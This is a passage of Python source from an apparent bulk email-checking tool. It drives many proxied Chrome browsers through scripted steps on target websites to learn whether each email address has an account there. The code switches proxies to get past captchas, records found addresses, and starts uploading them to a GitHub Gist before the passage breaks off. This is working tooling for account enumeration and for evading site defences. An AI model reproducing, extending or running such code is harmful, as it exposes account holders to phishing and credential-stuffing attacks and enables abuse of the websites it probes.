                        url_after2 = driver.current_url
                        body_after2 = driver.execute_script("return document.body.innerText.length") or 0
                        if url_after2 == url_before and abs(body_after2 - body_before) < 100:
                            driver.execute_script("""
                                var el = arguments[0];
                                var form = el.closest('form');
                                if (form) { form.submit(); }
                            """, el)
                            time.sleep(0.5)
                except:
                    pass
                if thread_id:
                    add_log(f'[{thread_id}] Clicked {sel_type}:{sel_val[:25]}', 'info')
                time.sleep(0.5)  # Wait for page reaction

            elif action == 'press_enter':
                # JavaScript-based Enter key — doesn't need OS focus
                if sel_val:
                    el = _find_interactive_element(driver, by, sel_val, timeout)
                else:
                    el = driver.switch_to.active_element
                driver.execute_script("""
                    var el = arguments[0];
                    el.dispatchEvent(new KeyboardEvent('keydown', {key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true}));
                    el.dispatchEvent(new KeyboardEvent('keypress', {key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true}));
                    el.dispatchEvent(new KeyboardEvent('keyup', {key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true}));
                    // Also submit the form if element is inside one
                    var form = el.closest('form');
                    if (form) form.submit();
                """, el)

            elif action == 'wait':
                # WAIT action: poll INDEFINITELY until element exists AND is displayed,
                # then continue to next step. Ignores on_success, on_failure, and timeout.
                if sel_type == 'text' and sel_val:
                    # Poll page text indefinitely for the target string
                    while True:
                        if is_stopped:
                            raise ProxyError("Job stopped by user")
                        try:
                            page_text = driver.find_element(By.TAG_NAME, 'body').text
                            if sel_val.lower() in page_text.lower():
                                add_log(f'[{thread_id}] Wait: text "{sel_val[:25]}" found on page', 'info')
                                break
                        except:
                            pass
                        time.sleep(0.5)
                elif sel_val:
                    # Poll indefinitely until element exists AND is truly visible (deep JS check)
                    while True:
                        if is_stopped:
                            raise ProxyError("Job stopped by user")
                        try:
                            el = driver.find_element(by, sel_val)
                            visible, detail = _is_element_visible(driver, el, thread_id=thread_id)
                            if visible:
                                add_log(f'[{thread_id}] Wait: element {sel_type}:{sel_val[:25]} found and visible (w={detail.get("w")},h={detail.get("h")})', 'info')
                                break
                        except:
                            pass
                        time.sleep(0.5)
                else:
                    # No selector — just sleep (break into small increments for stop responsiveness)
                    for _ in range(max(1, int(timeout / 0.3))):
                        if is_stopped:
                            raise ProxyError("Job stopped by user")
                        time.sleep(0.3)
                # Mark step done and skip to next step — ignore on_success/on_failure
                sp[idx] = 'done'
                if thread_id:
                    with lock:
                        step_progress[thread_id] = dict(sp)
                if step_delay > 0 and idx < len(steps) - 1:
                    for _ in range(max(1, int(step_delay / 0.3))):
                        if is_stopped:
                            raise ProxyError("Job stopped by user")
                        time.sleep(0.3)
                continue

            elif action == 'check_element':
                # CHECK ELEMENT action: poll for element up to timeout seconds.
                # If found and displayed → apply on_success.
                # If timeout expires and not displayed → apply on_failure.
                check_end = time.time() + timeout
                found_el = False
                vis_detail = {}
                while time.time() < check_end:
                    if is_stopped:
                        raise ProxyError("Job stopped by user")
                    try:
                        el = driver.find_element(by, sel_val)
                        visible, vis_detail = _is_element_visible(driver, el, thread_id=thread_id)
                        if visible:
                            found_el = True
                            break
                    except:
                        pass
                    time.sleep(0.5)

                if found_el:
                    # Element found and truly visible — apply on_success
                    add_log(f'[{thread_id}] Check element: {sel_type}:{sel_val[:25]} VISIBLE (w={vis_detail.get("w")},h={vis_detail.get("h")}) — on_success={on_ok}', 'info')
                    sp[idx] = 'done'
                    if thread_id:
                        with lock:
                            step_progress[thread_id] = dict(sp)
                    if on_ok == 'mark_valid':
                        return 'valid'
                    elif on_ok == 'mark_invalid':
                        return 'invalid'
                    elif on_ok == 'proxy_error':
                        raise ProxyError("Element found — on_success=proxy_error")
                    elif on_ok == 'captcha_error':
                        raise CaptchaError("Element found — on_success=captcha_error")
                    # on_ok == 'continue' → proceed to next step
                    continue
                else:
                    # Element NOT found / not visible after timeout — apply on_failure
                    reason = vis_detail.get('reason', 'not_found')
                    add_log(f'[{thread_id}] Check element: {sel_type}:{sel_val[:25]} NOT VISIBLE after {timeout}s (reason={reason}) — on_failure={on_fail}', 'warn')
                    sp[idx] = 'failed'
                    if thread_id:
                        with lock:
                            step_progress[thread_id] = dict(sp)
                    if on_fail == 'mark_valid':
                        return 'valid'
                    elif on_fail == 'mark_invalid':
                        return 'invalid'
                    elif on_fail == 'proxy_error':
                        raise ProxyError("Element check timed out")
                    elif on_fail == 'captcha_error':
                        raise CaptchaError("Captcha detected on element check")
                    # on_fail == 'continue' → proceed to next step
                    continue

            # Handle on_success
            sp[idx] = 'done'
            if thread_id:
                with lock:
                    step_progress[thread_id] = dict(sp)
            if on_ok == 'mark_valid':
                return 'valid'
            elif on_ok == 'mark_invalid':
                return 'invalid'
            elif on_ok == 'proxy_error':
                raise ProxyError("Step succeeded — on_success=proxy_error")
            elif on_ok == 'captcha_error':
                raise CaptchaError("Step succeeded — on_success=captcha_error")

            # Small delay between steps to let the page process each action
            if step_delay > 0 and idx < len(steps) - 1:
                for _ in range(max(1, int(step_delay / 0.3))):
                    if is_stopped:
                        raise ProxyError("Job stopped by user")
                    time.sleep(0.3)

        except (ProxyError, CaptchaError):
            sp[idx] = 'failed'
            if thread_id:
                with lock:
                    step_progress[thread_id] = dict(sp)
            raise
        except Exception as e:
            sp[idx] = 'failed'
            if thread_id:
                with lock:
                    step_progress[thread_id] = dict(sp)
            if on_fail == 'proxy_error':
                raise ProxyError(str(e))
            elif on_fail == 'captcha_error':
                raise CaptchaError(str(e))
            elif on_fail == 'mark_valid':
                return 'valid'
            elif on_fail == 'mark_invalid':
                return 'invalid'
            # on_fail == 'continue' → skip
    return result  # None means inconclusive

def create_browser(proxy, config, thread_id=None):
    """Create a Chrome browser with the given proxy. Each browser gets its own
    user-data-dir, debugger port, AND its own ChromeService (chromedriver process)
    so multiple instances are fully independent and never conflict.
    If proxy is None (no_proxy mode), browsers connect directly without any proxy."""
    chrome_options = Options()
    if proxy:
        chrome_options.add_argument(f'--proxy-server={proxy}')
    chrome_options.add_argument('--disable-gpu')
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--disable-dev-shm-usage')
    chrome_options.add_argument('--log-level=3')
    chrome_options.add_argument('--disable-background-networking')
    chrome_options.add_argument('--disable-extensions')
    chrome_options.add_argument('--disable-background-timer-throttling')
    chrome_options.add_argument('--disable-backgrounding-occluded-windows')
    chrome_options.add_argument('--disable-renderer-backgrounding')
    # Parallel-safety flags — prevent Chrome from throttling or interfering
    chrome_options.add_argument('--disable-hang-monitor')
    chrome_options.add_argument('--disable-ipc-flooding-protection')
    chrome_options.add_argument('--disable-popup-blocking')
    chrome_options.add_argument('--disable-features=TranslateUI')
    chrome_options.add_argument('--autoplay-policy=no-user-gesture-required')
    # Unique debugger port per browser from recyclable pool
    port = _allocate_port()
    chrome_options.add_argument(f'--remote-debugging-port={port}')
    # Unique profile directory per browser instance to avoid conflicts
    profile_dir = tempfile.mkdtemp(prefix=f'dahaka_{thread_id or "b"}_')
    chrome_options.add_argument(f'--user-data-dir={profile_dir}')
    if config.get('headless_mode', 0):
        # Use new headless mode — has full rendering engine (layout, dimensions, etc.)
        chrome_options.add_argument('--headless=new')
        # Set explicit window size — headless defaults to 800x600 which causes
        # responsive pages to hide elements or collapse layouts
        chrome_options.add_argument('--window-size=1920,1080')
    # CSS Included = No → block stylesheets and fonts at the network level.
    # Only HTML + JS will load through the proxy — faster, fewer connection resets.
    if not config.get('css_check_enabled', 1):
        chrome_options.add_experimental_option('prefs', {
            'profile.managed_default_content_settings.stylesheets': 2,  # 2 = Block
        })
        # Also block font downloads via command-line flag
        chrome_options.add_argument('--disable-remote-fonts')
    # CRITICAL: Each browser gets its OWN fresh ChromeService (= own chromedriver process).
    # Reusing a ChromeService after driver.quit() leaves the chromedriver in a stale state
    # where Chrome opens but the WebDriver→DevTools pipe is broken, causing all
    # interactions (type, click, etc.) to be silently dropped.
    driver_path = get_chromedriver_path()
    chrome_service = ChromeService(driver_path)
    driver = webdriver.Chrome(service=chrome_service, options=chrome_options)
    driver.set_page_load_timeout(config.get('page_load_timeout', 30))  # 30s — proxied pages load slower
    # Store metadata on driver for cleanup
    driver._dahaka_profile_dir = profile_dir
    driver._dahaka_debug_port = port
    driver._dahaka_chrome_service = chrome_service  # track for clean shutdown
    return driver

def process_email(driver, proxy, email, domain, steps, config, thread_id=None):
    """Run automation steps for one email on an existing browser.
    Returns 'valid', 'invalid'.
    Raises ProxyError (caller should refresh) or CaptchaError (caller should close browser).
    """
    global success_count, failure_count

    with lock:
        current_emails.append({'email': email, 'status': 'Checking...', 'domain': domain['name'], 'timestamp': time.time()})

    result = execute_automation(driver, steps, email, domain['url'], config, thread_id=thread_id)

    if result not in ('valid', 'invalid'):
        raise ProxyError("Automation returned no result")

    with lock:
        if result == 'valid':
            success_count += 1
            for e in current_emails:
                if e['email'] == email:
                    e.update({'status': 'Present', 'timestamp': time.time()})
                    break
            add_log(f'✓ {email} — Valid — {domain["name"]}', 'good')
            if thread_id and thread_id in browser_stats:
                browser_stats[thread_id]['success'] += 1
                browser_stats[thread_id]['tested'] += 1
                browser_stats[thread_id]['last_email'] = email
        else:
            failure_count += 1
            for e in current_emails:
                if e['email'] == email:
                    e.update({'status': 'Not Present', 'timestamp': time.time()})
                    break
            add_log(f'✗ {email} — Invalid — {domain["name"]}', 'bad')
            if thread_id and thread_id in browser_stats:
                browser_stats[thread_id]['fail'] += 1
                browser_stats[thread_id]['tested'] += 1
                browser_stats[thread_id]['last_email'] = email

        # Update proxy state
        if proxy in proxy_info:
            proxy_info[proxy]['state'] = 'active'
            proxy_info[proxy]['retries'] = 0
            proxy_stats['active'] = sum(1 for p in proxy_info.values() if p['state'] == 'active')
            if config.get('turbo_mode', 1):
                with turbo_lock:
                    if proxy not in turbo_proxies:
                        turbo_proxies.append(proxy)

    # Save result to DB
    if current_job_id:
        db.add_result(current_job_id, email, domain['id'], result, proxy)

    # Auto-update linked email list
    if current_email_list_id:
        result_val = '1' if result == 'valid' else '0'
        try:
            db.update_email_entry_result_by_email(current_email_list_id, email, domain['id'], result_val)
        except Exception:
            pass  # don't let list update errors break the job

    return result

def pick_proxy(config, email=None):
    """Pick an available proxy. Returns proxy string or None."""
    # Extract turbo list BEFORE taking the main lock to reduce contention
    turbo_list = []
    if config.get('turbo_mode', 1):
        with turbo_lock:
            turbo_list = list(turbo_proxies)  # snapshot
    with lock:
        # Filter turbo list against proxy_info and attempted
        turbo_list = [p for p in turbo_list if proxy_info.get(p, {}).get('state') == 'active'
                      and (email is None or p not in attempted_proxies.get(email, set()))]
        normal_list = [p for p in proxy_info if proxy_info[p]['state'] in ('available', 'active')
                       and (email is None or p not in attempted_proxies.get(email, set()))
                       and p not in turbo_list]
        available = turbo_list + normal_list
        if not available:
            load_proxies(config)
            turbo_list = []
            if config.get('turbo_mode', 1):
                with turbo_lock:
                    turbo_list = [p for p in turbo_proxies if proxy_info.get(p, {}).get('state') == 'active']
            normal_list = [p for p in proxy_info if proxy_info[p]['state'] in ('available', 'active')]
            available = turbo_list + normal_list
        if not available:
            return None
        proxy = random.choice(turbo_list) if turbo_list else random.choice(available)
        if email:
            attempted_proxies[email].add(proxy)
        return proxy

# ── Worker Thread (Persistent Browser) ─────────────────────────────
def worker(thread_id, domain, steps, config, private_queue=None, my_generation=None):
    # Each worker gets its OWN deep copy of steps and domain to avoid shared-state issues
    steps = copy.deepcopy(steps)
    domain = copy.deepcopy(domain)
    q = private_queue or email_queue
    driver = None
    proxy = None
    MAX_REFRESH_RETRIES = 5
    # Snapshot generation so worker can detect if it's stale
    if my_generation is None:
        my_generation = job_generation
    # NOTE: No persistent ChromeService here. Each open_browser() call creates a
    # FRESH ChromeService (= fresh chromedriver process). This is critical because
    # reusing a ChromeService after driver.quit() leaves chromedriver in a stale state
    # where Chrome opens visually but the WebDriver→DevTools pipe is broken.

    def close_driver():
        nonlocal driver
        if driver:
            # Save metadata before quitting
            profile_dir = getattr(driver, '_dahaka_profile_dir', None)
            debug_port = getattr(driver, '_dahaka_debug_port', None)
            chrome_service = getattr(driver, '_dahaka_chrome_service', None)
            try:
                driver.quit()
            except:
                pass
            # Also stop the chromedriver process itself to prevent zombie processes
            if chrome_service:
                try:
                    chrome_service.stop()
                except:
                    pass
            driver = None
            with active_drivers_lock:
                active_drivers.pop(thread_id, None)
            # Return debug port to the pool for reuse by other browsers
            _release_port(debug_port)
            # Delay before cleanup — Chrome may still hold file locks
            time.sleep(0.5)
            # Clean up temp profile directory
            if profile_dir:
                try:
                    shutil.rmtree(profile_dir, ignore_errors=True)
                except:
                    pass

    def open_browser():
        nonlocal driver, proxy
        close_driver()
        if is_stopped:
            return False
        is_no_proxy = config.get('proxy_mode') == 'no_proxy'
        if is_no_proxy:
            proxy = None  # No proxy — direct connection
        else:
            proxy = pick_proxy(config)
            if not proxy:
                # Wait for proxies
                for _ in range(12):
                    if is_stopped:
                        return False
                    add_log(f'⏳ {thread_id}: No proxies. Waiting 10s...', 'warn')
                    # Sleep in small increments so we can react to stop quickly
                    for _ in range(20):
                        if is_stopped:
                            return False
                        time.sleep(0.5)
                    proxy = pick_proxy(config)
                    if proxy:
                        break
                if not proxy:
                    add_log(f'✗ {thread_id}: No proxies available, stopping', 'bad')
                    return False
        if is_stopped:
            return False
        try:
            # CRITICAL: create_browser() creates a FRESH ChromeService each time.
            # This ensures a clean chromedriver process with a working DevTools pipe.
            driver = create_browser(proxy, config, thread_id=thread_id)
            # Register the driver so stop can force-kill it
            with active_drivers_lock:
                active_drivers[thread_id] = driver
            if proxy:
                add_log(f'🌐 {thread_id}: Browser opened via {proxy}', 'info')
            else:
                add_log(f'🌐 {thread_id}: Browser opened (no proxy — direct)', 'info')
            return True
        except Exception as e:
            add_log(f'✗ {thread_id}: Failed to open browser — {str(e)[:60]}', 'bad')
            driver = None
            return False

    try:
        # Open initial browser
        if not open_browser():
            with lock:
                browser_threads_status[thread_id] = 'stopped'
                step_progress.pop(thread_id, None)
            return

        while True:
            # Check for stop or stale generation
            if is_stopped or job_generation != my_generation:
                break
            pause_event.wait()
            if is_stopped or job_generation != my_generation:
                break

            try:
                email = q.get(timeout=1)
            except queue.Empty:
                if is_stopped:
                    break
                continue
            if email is None:
                q.task_done()
                break
            if is_stopped or job_generation != my_generation:
                q.task_done()
                break

            # For unique_email mode, track per-domain processed
            email_domain_key = f'{email}:{domain["id"]}'
            with lock:
                if email_domain_key in processed_emails:
                    q.task_done()
                    continue

            with lock:
                browser_threads_status[thread_id] = f'checking:{email}'

            refresh_retries = 0
            email_done = False

            # Check if this email has already been attempted too many times (across all proxy switches)
            with lock:
                email_attempt_counts[email_domain_key] += 1
                attempt_num = email_attempt_counts[email_domain_key]
            if attempt_num > MAX_EMAIL_ATTEMPTS:
                with lock:
                    skipped_count += 1
                    processed_emails.add(email_domain_key)
                    current_emails.append({'email': email, 'status': 'Skipped', 'domain': domain['name'], 'timestamp': time.time()})
                add_log(f'⏭ {thread_id}: Skipping {email} — tried {attempt_num - 1} times with no result (some emails behave differently)', 'warn')
                if current_job_id:
                    db.add_result(current_job_id, email, domain['id'], 'skipped', proxy or '')
                q.task_done()
                with lock:
                    browser_threads_status[thread_id] = 'idle'
                    step_progress.pop(thread_id, None)
                continue

            while not email_done and not is_stopped and job_generation == my_generation:
                pause_event.wait()
                if is_stopped or job_generation != my_generation:
                    break
                try:
                    result = process_email(driver, proxy, email, domain, steps, config, thread_id=thread_id)
                    # Success — navigate fresh to domain URL for next email
                    # (driver.back() is unreliable with SPAs — page state may not restore)
                    try:
                        if not is_stopped:
                            driver.get(domain['url'])
                            time.sleep(2)
                            try:
                                WebDriverWait(driver, 10).until(
                                    lambda d: d.execute_script("return document.readyState") == "complete"
                                )
                            except:
                                pass
                            try:
                                WebDriverWait(driver, 5).until(
                                    EC.presence_of_element_located((By.CSS_SELECTOR, "input, button, a"))
                                )
                            except:
                                pass
                    except:
                        pass
                    with lock:
                        processed_emails.add(email_domain_key)
                    email_done = True

                except CaptchaError as ce:
                    if is_stopped:
                        break
                    # Captcha — close browser, open new one with new proxy, retry same email
                    add_log(f'🔒 {thread_id}: Captcha detected — switching proxy', 'bad')
                    with lock:
                        if proxy in proxy_info:
                            proxy_info[proxy]['state'] = 'failed'
                            proxy_stats['failed'] = sum(1 for p in proxy_info.values() if p['state'] == 'failed')
                        if config.get('turbo_mode', 1):
                            with turbo_lock:
                                if proxy in turbo_proxies:
                                    turbo_proxies.remove(proxy)
                    if is_stopped or not open_browser():
                        # Stopped or can't get new browser, put email back
                        with lock:
                            if email not in processed_emails:
                                email_queue.put(email)
                        email_done = True

                except ProxyError as pe:
                    if is_stopped:
                        break
                    # Proxy error — refresh and retry
                    refresh_retries += 1
                    # Also increment global attempt counter for this email
                    with lock:
                        email_attempt_counts[email_domain_key] += 1
                        total_attempts = email_attempt_counts[email_domain_key]
                    if total_attempts > MAX_EMAIL_ATTEMPTS:
                        # Too many total attempts — skip this email entirely
                        with lock:
                            skipped_count += 1
                            processed_emails.add(email_domain_key)
                            current_emails.append({'email': email, 'status': 'Skipped', 'domain': domain['name'], 'timestamp': time.time()})
                        add_log(f'⏭ {thread_id}: Skipping {email} — {total_attempts - 1} total attempts with no result', 'warn')
                        if current_job_id:
                            db.add_result(current_job_id, email, domain['id'], 'skipped', proxy or '')
                        email_done = True
                    elif refresh_retries > MAX_REFRESH_RETRIES:
                        add_log(f'🔄 {thread_id}: Max refresh retries — switching proxy (attempt {total_attempts}/{MAX_EMAIL_ATTEMPTS})', 'warn')
                        if is_stopped or not open_browser():
                            with lock:
                                if email_domain_key not in processed_emails:
                                    q.put(email)
                            email_done = True
                        else:
                            refresh_retries = 0
                    else:
                        with lock:
                            browser_threads_status[thread_id] = f'retry:{email}'
                        add_log(f'🔄 {thread_id}: Refresh retry {refresh_retries}/{MAX_REFRESH_RETRIES}', 'warn')
                        try:
                            driver.refresh()
                            # Wait for page to stabilize after refresh
                            time.sleep(2)
                            try:
                                WebDriverWait(driver, 10).until(
                                    lambda d: d.execute_script("return document.readyState") == "complete"
                                )
                            except:
                                pass
                            try:
                                WebDriverWait(driver, 5).until(
                                    EC.presence_of_element_located((By.CSS_SELECTOR, "input, button, a"))
                                )
                            except:
                                pass
                        except:
                            if is_stopped or not open_browser():
                                with lock:
                                    if email_domain_key not in processed_emails:
                                        q.put(email)
                                email_done = True
                            else:
                                refresh_retries = 0

                except Exception as e:
                    if is_stopped:
                        break
                    add_log(f'✗ {thread_id}: {str(e)[:60]}', 'bad')
                    if is_stopped or not open_browser():
                        with lock:
                            if email_domain_key not in processed_emails:
                                q.put(email)
                        email_done = True
                    else:
                        refresh_retries = 0

            q.task_done()
            with lock:
                browser_threads_status[thread_id] = 'idle'
                step_progress.pop(thread_id, None)

    finally:
        close_driver()
        with lock:
            browser_threads_status[thread_id] = 'stopped'
            step_progress.pop(thread_id, None)

# ── Status Updater ─────────────────────────────────────────────────
def update_status():
    while True:
        config = cfg()
        elapsed = time.time() - start_time if start_time else 0
        with lock:
            proxies_list = [{'proxy': p, 'status': proxy_info[p]['state'], 'retries': proxy_info[p].get('retries', 0)} for p in proxy_info]
            now = time.time()
            ttl = config.get('current_emails_ttl', 10)
            current_emails[:] = [e for e in current_emails if now - e.get('timestamp', 0) < ttl]
            with turbo_lock:
                in_turbo = config.get('turbo_mode', 1) and len(turbo_proxies) > 0
            with log_lock:
                recent_logs = list(log_entries)[-30:]
            status_data = {
                'status': 'stopping' if _cleanup_in_progress else ('paused' if is_paused else ('running' if is_running else ('finished' if is_finished else 'idle'))),
                'total_emails': total_emails,
                'processed': len(processed_emails),
                'success': success_count,
                'failure': failure_count,
                'skipped': skipped_count,
                'proxies': {'total': proxy_stats['total'], 'active': proxy_stats['active'], 'failed': proxy_stats['failed'], 'retrying': proxy_stats.get('retrying', 0)},
                'proxies_list': proxies_list,
                'current_emails': current_emails[:config.get('display_limit', 10)],
                'uptime': round(elapsed, 2),
                'in_turbo_mode': in_turbo,
                'config': config,
                'log_entries': recent_logs,
                'browser_threads': dict(browser_threads_status),
                'proxy_mode': config.get('proxy_mode', 'local_file'),
                'job_id': current_job_id,
                'domain_name': current_domain_name,
                'automation_steps': [{'action': s.get('action',''), 'selector_type': s.get('selector_type',''), 'selector_value': s.get('selector_value',''), 'description': s.get('description',''), 'on_success': s.get('on_success',''), 'on_failure': s.get('on_failure','')} for s in current_steps] if current_steps else [],
                'step_progress': dict(step_progress),
                'browser_stats': dict(browser_stats),
                'browser_domains': dict(browser_domains)
            }
        socketio.emit('update', status_data)
        socketio.sleep(config.get('status_update_interval', 1))

# ── Background Job ─────────────────────────────────────────────────────
def background_job(domain_id, emails, domain_ids=None):
    global total_emails, is_running, is_finished, start_time, success_count, failure_count, current_job_id, current_domain_name, current_steps, current_domain_ids, skipped_count
    my_generation = job_generation  # snapshot — if it changes, we're stale
    try:
        config = cfg()
        # Multi-domain support
        if domain_ids and len(domain_ids) > 1:
            current_domain_ids = domain_ids
            domains_list = [db.get_domain(did) for did in domain_ids]
            domains_list = [d for d in domains_list if d]
            if not domains_list:
                add_log('✗ No valid domains found', 'bad')
                return
            # Use first domain's steps as reference, load steps per domain
            domain_steps_map = {}
            for d in domains_list:
                s = db.get_steps(d['id'])
                if s:
                    domain_steps_map[d['id']] = (d, s)
            if not domain_steps_map:
                add_log('✗ No automation steps found for any domain', 'bad')
                return
            domain = domains_list[0]
            steps = list(domain_steps_map.values())[0][1]
            domain_names = ', '.join(d['name'] for d in domains_list)
        else:
            current_domain_ids = [domain_id] if domain_id else []
            domain = db.get_domain(domain_id)
            steps = db.get_steps(domain_id)
            domain_steps_map = {domain_id: (domain, steps)} if domain and steps else {}
            domain_names = domain['name'] if domain else '?'

        if not domain or not steps:
            add_log('✗ Domain or steps not found', 'bad')
            return

        is_running = True
        is_finished = False
        start_time = time.time()
        success_count = 0
        failure_count = 0
        skipped_count = 0
        processed_emails.clear()
        email_attempt_counts.clear()
        attempted_proxies.clear()
        current_emails.clear()
        proxy_info.clear()
        turbo_proxies.clear()
        proxy_stats.update({'total': 0, 'active': 0, 'failed': 0, 'retrying': 0})
        browser_threads_status.clear()
        step_progress.clear()
        browser_stats.clear()
        browser_domains.clear()

        total_emails = len(emails)
        current_job_id = db.create_job(domain_id or domain_ids[0], total_emails)
        current_domain_name = domain_names
        current_steps = steps
        add_log(f'🚀 Job {current_job_id} started — {domain_names} — {total_emails} emails', 'good')
        socketio.emit('check_started', {'job_id': current_job_id, 'domain_name': domain_names, 'steps': steps})

        if is_stopped or job_generation != my_generation:
            return

        load_proxies(config)

        if is_stopped or job_generation != my_generation:
            return

        # Validate proxies before starting (skip in no_proxy mode)
        is_no_proxy_mode = config.get('proxy_mode') == 'no_proxy'
        is_rotated_mode = config.get('proxy_mode') == 'rotated_ip'
        if is_no_proxy_mode:
            add_log('🚫 No Proxy mode — skipping proxy validation', 'info')
        else:
            valid_count = validate_all_proxies(config)
            if valid_count == 0:
                if is_rotated_mode:
                    # Rotated IP: keep retrying every 5s — never abort
                    add_log('⚠ No valid proxies yet — retrying in 5s (rotated IP mode)...', 'warn')
                    while valid_count == 0 and not is_stopped:
                        for _ in range(5):
                            if is_stopped:
                                break
                            time.sleep(1)
                        if is_stopped:
                            break
                        load_proxies(config)
                        valid_count = validate_all_proxies(config)
                        if valid_count == 0:
                            add_log('⚠ Still no valid proxies — retrying in 5s...', 'warn')
                    if is_stopped:
                        add_log('⏹ Job stopped during proxy validation', 'bad')
                        if current_job_id:
                            db.update_job(current_job_id, {'status': 'stopped', 'finished_at': datetime.now().isoformat()})
                        reset_job_state()
                        socketio.emit('job_stopped', {})
                        return
                else:
                    # Local file mode: abort immediately
                    add_log('✗ No valid proxies — aborting job', 'bad')
                    db.update_job(current_job_id, {'status': 'failed', 'finished_at': datetime.now().isoformat()})
                    is_running = False
                    is_finished = True
                    socketio.emit('error', {'message': 'No valid proxies found. All proxies failed google.com check.'})
                    return

        if is_stopped or job_generation != my_generation:
            return

        n_browsers = config.get('concurrent_browsers', 10)
        email_mode = config.get('multi_domain_email_mode', 'same_email')
        add_log(f'🌐 Launching {n_browsers} browsers — mode: {email_mode}', 'info')

        # Assign domains to browsers based on config mapping
        browser_domain_map = {}
        try:
            browser_domain_map = json.loads(config.get('browser_domain_map', '{}'))
        except:
            pass

        # Build per-browser queues for multi-domain modes
        browser_queues = {}  # tid -> Queue
        is_multi_domain = domain_ids and len(domain_ids) > 1
        is_unique_mode = email_mode == 'unique_email' and is_multi_domain
        is_same_mode = email_mode == 'same_email' and is_multi_domain
        use_private_queues = is_unique_mode or is_same_mode

        # Step 1: Configure browser metadata (don't start threads yet)
        browser_configs = []  # [(tid, b_domain, b_steps), ...]
        domain_browser_map = {}  # domain_id -> [tid, ...]
        # For multi-domain: auto-distribute browsers round-robin if no explicit map
        domain_list = list(domain_steps_map.values()) if is_multi_domain and domain_steps_map else []
        for i in range(n_browsers):
            tid = f'browser-{i+1}'
            browser_threads_status[tid] = 'idle'
            mapped_did = browser_domain_map.get(str(i))
            if mapped_did and int(mapped_did) in domain_steps_map:
                b_domain, b_steps = domain_steps_map[int(mapped_did)]
            elif domain_list:
                # Auto round-robin across all domains
                b_domain, b_steps = domain_list[i % len(domain_list)]
            else:
                b_domain, b_steps = domain, steps
            browser_domains[tid] = b_domain['name']
            browser_stats[tid] = {'success': 0, 'fail': 0, 'tested': 0, 'domain': b_domain['name'], 'proxy': '', 'last_email': ''}
            did = b_domain['id']
            if did not in domain_browser_map:
                domain_browser_map[did] = []
            domain_browser_map[did].append(tid)
            browser_configs.append((tid, b_domain, b_steps))

        # Step 2: ALWAYS create a private queue per browser — never use shared email_queue
        # This ensures each browser is fully independent with its own work list
        browser_queues = {}
        for tid, _, _ in browser_configs:
            browser_queues[tid] = queue.Queue()

        if is_same_mode:
            # Also keep domain_queues reference for same-email mode (shared per domain)
            domain_queues = {}
            for did, tids in domain_browser_map.items():
                dq = queue.Queue()
                domain_queues[did] = dq
                for tid in tids:
                    browser_queues[tid] = dq

        # Register ALL private queues for stop-handler access
        active_worker_queues.clear()
        seen_queues = set()
        for q in browser_queues.values():
            qid = id(q)
            if qid not in seen_queues:
                seen_queues.add(qid)
                active_worker_queues.append(q)

        # Step 3: Pre-install chromedriver before spawning any threads
        add_log('🔧 Pre-installing ChromeDriver...', 'info')
        get_chromedriver_path()

        if is_stopped or job_generation != my_generation:
            return

        # Step 4: Start all threads with stagger delay — each browser launches one at a time
        threads = []
        active_worker_threads.clear()
        stagger_delay = config.get('browser_stagger_delay', 3)  # seconds between launches
        for i, (tid, b_domain, b_steps) in enumerate(browser_configs):
            if is_stopped or job_generation != my_generation:
                break
            t = threading.Thread(target=worker, args=(tid, b_domain, b_steps, config, browser_queues[tid], my_generation))
            t.start()
            threads.append(t)
            active_worker_threads.append(t)
            add_log(f'🚀 {tid} thread started ({i+1}/{n_browsers})', 'info')
            # Stagger: wait between browser launches to avoid overwhelming the system
            if i < len(browser_configs) - 1:
                for _ in range(int(stagger_delay * 2)):
                    if is_stopped or job_generation != my_generation:
                        break
                    time.sleep(0.5)

        if is_stopped or job_generation != my_generation:
            # Drain queues and bail
            for bq in browser_queues.values():
                bq.put(None)
            for t in threads:
                t.join(timeout=3)
            return

        # Step 5: Enqueue emails — round-robin distribute to each browser's private queue
        browser_tids = [tid for tid, _, _ in browser_configs]
        if is_same_mode:
            # Same-email: every email goes to every domain queue
            for email in emails:
                if is_stopped:
                    break
                for dq in domain_queues.values():
                    dq.put(email)
            # Poison pills
            for did, tids in domain_browser_map.items():
                for _ in tids:
                    domain_queues[did].put(None)
            add_log(f'📋 Same-email mode: {len(emails)} emails × {len(domain_queues)} domains = {len(emails) * len(domain_queues)} checks', 'info')
        else:
            # Round-robin emails across all browser queues (each browser gets ~equal share)
            for idx, email in enumerate(emails):
                if is_stopped:
                    break
                target_tid = browser_tids[idx % len(browser_tids)]
                browser_queues[target_tid].put(email)
            # Send poison pill to each browser's queue
            for tid in browser_tids:
                browser_queues[tid].put(None)
            emails_per = len(emails) // max(len(browser_tids), 1)
            add_log(f'📋 Distributed {len(emails)} emails across {len(browser_tids)} browsers (~{emails_per} each)', 'info')

        # Wait for all queues to drain or stop signal
        stopped_or_stale = lambda: is_stopped or job_generation != my_generation
        all_queues = list(set(browser_queues.values()))  # deduplicated
        while not stopped_or_stale():
            all_empty = all(bq.empty() for bq in all_queues)
            all_dead = all(not t.is_alive() for t in threads)
            if all_empty or all_dead:
                break
            time.sleep(0.5)

        # Wait for worker threads to finish — use short timeout if stopped
        join_timeout = 2 if stopped_or_stale() else 30
        for t in threads:
            t.join(timeout=join_timeout)
            if stopped_or_stale():
                break

        # Only update DB/emit events if this job is still the current one (not stale)
        if not stopped_or_stale():
            db.update_job(current_job_id, {'status': 'finished', 'processed': len(processed_emails), 'success': success_count, 'failure': failure_count, 'finished_at': datetime.now().isoformat()})
            add_log(f'✅ Job done — {success_count} valid, {failure_count} invalid' + (f', {skipped_count} skipped' if skipped_count else ''), 'good')
            
            # ---- Send to GitHub Gist ----
            add_log("Uploading results to GitHub Gist...", "info")
            try:
                job_results = db.get_results(current_job_id)
                lines = []
                timestamp_header = f"\n--- Results from {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---"
                
                domains_dict = {d['id']: d['name'] for d in db.get_domains()}
                
                for r in job_results:
                    if r.get("result") in ("valid", "Present"):
                        domain_name = domains_dict.get(r.get("domain_id"), "Unknown")
                        lines.append(f"{r['email']} | {domain_name} | FOUND")
                        
                if lines:
                    new_text = timestamp_header + "\n" + "\n".join(lines) + "\n"
                else:
                    new_text = timestamp_header + "\nno email valid\n"
                    
                if paste_mode == 'new':
